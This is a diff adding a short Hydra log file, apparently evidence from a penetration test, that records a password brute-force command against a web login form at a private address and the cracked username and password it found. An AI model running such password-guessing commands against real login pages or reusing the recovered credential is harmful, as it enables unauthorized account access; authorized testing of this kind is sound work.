@@ -1,0 +1,2 @@
+# Hydra v9.5 run at 2025-09-10 16:12:29 on 192.168.100.101 http-post-form (hydra -I -V -f -l wangxx -P wordlists/biographical_ultra_8char.txt -t 1 -w 5 -o evidence/html_ultra_biographical_results.txt 192.168.100.101 http-post-form /dologin.html:httpd_username=^USER^&httpd_password=^PASS^:Invalid)
+[80][http-post-form] host: 192.168.100.101   login: wangxx   password: wangxx25
